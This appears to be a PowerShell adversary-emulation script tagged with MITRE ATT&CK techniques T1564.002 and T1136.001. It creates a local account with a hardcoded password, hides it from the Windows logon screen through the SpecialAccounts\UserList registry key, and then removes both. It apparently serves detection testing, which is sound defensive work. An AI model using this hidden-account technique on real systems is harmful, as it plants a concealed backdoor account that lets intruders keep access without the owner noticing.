<#
  T1564.002 - Hide Artifacts: Hidden Users
  T1136.001 - Create Account: Local Account
  Simple script create a local account and  prevent that user from being listed on the logon screen
#>

# Defining local user
[CmdletBinding()]
param (
    [Parameter(Mandatory=$false)]
    [string]$localUser="hidden_user$",
    [Parameter(Mandatory=$false)]
    [string]$password="P@ssw0rd"
)

# Setting password
$securePassword = ConvertTo-SecureString -String $password -AsPlainText -Force

# Creating local user
try {
    New-LocalUser -Name $localUser -Password $securePassword -AccountNeverExpires -PasswordNeverExpires
}
catch {
    Write-Host -ForegroundColor Red "Error creating local user: $_"
}

# Hiding local user from login screen 
if (Get-LocalUser -Name $localUser) {
    Write-Host -ForegroundColor Green "User $localUser created"
    try {
        If (Test-Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList") {
            Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name $localUser -Value 0 -Type DWORD -Force
            # Also simulate with reg add commands:
            reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /v $localUser /d 0 /f
            Write-Host -ForegroundColor Green "User $localUser is now hidden from login screen"
        }
        Else {
            # The key does not exist, create the key and set the value
            New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "SpecialAccounts"
            New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts" -Name UserList
            New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name $localUser -Value 0 -Type DWORD -Force
            # Also simulate with reg add commands:
            reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /v $localUser /d 0 /f
            Write-Host -ForegroundColor Green "User $localUser is now hidden from login screen"
        }
    }
    catch {
        Write-Host -ForegroundColor Red "Error hiding the username from login screen: $_"
    }
    #reverse the actions
    try{
        if (Get-LocalUser -Name $localUser){
            #simulate reg and Remove-ItemProperty commands
            reg DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v $localUser /f
            Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name $localUser -Force -ErrorAction SilentlyContinue 
            Remove-LocalUser -Name $localUser
            if (-not (Get-LocalUser -Name $localUser -ErrorAction SilentlyContinue)){
                Write-Host -ForegroundColor Green "User $localUser is now deleted"
            }
        }
    }
    catch{
        Write-Host -ForegroundColor Red "Error hiding the username from login screen: $_"
    }
}
else {
    Write-Host "Error: User $localUser does not exit"
}

